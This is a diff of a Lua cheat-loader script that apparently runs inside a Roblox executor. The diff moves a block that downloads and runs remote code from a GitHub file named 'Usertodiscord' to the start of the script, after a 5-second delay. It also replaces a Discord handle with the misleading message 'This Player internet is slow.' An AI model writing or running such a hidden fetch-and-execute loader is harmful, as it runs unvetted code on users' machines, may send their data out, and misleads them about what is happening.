@@ -5,7 +5,7 @@ local playerGui = game:GetService("Players").LocalPlayer.PlayerGui
 local runService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
 local otherui1
-_G.whatmap = "discord : Seaweed_hunter"
+_G.whatmap = "This Player internet is slow."
     _G.myexec = "Unknown Executor"
     if getexecutorname then
       _G.myexec = getexecutorname()
@@ -17,6 +17,11 @@ local success, message = pcall(function()
 end)
 
 print("Phase 2 : Checking Games")
+
+task.spawn(function()
+     task.wait(5)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/yClematiS/Main_Loader/main/Usertodiscord"))()
+end)
 
 local tocheck = game.PlaceId
 if tocheck == 2866967438 then
@@ -137,7 +142,3 @@ else
         end)
     end
 end
-
-task.spawn(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/yClematiS/Main_Loader/main/Usertodiscord"))()
-end)
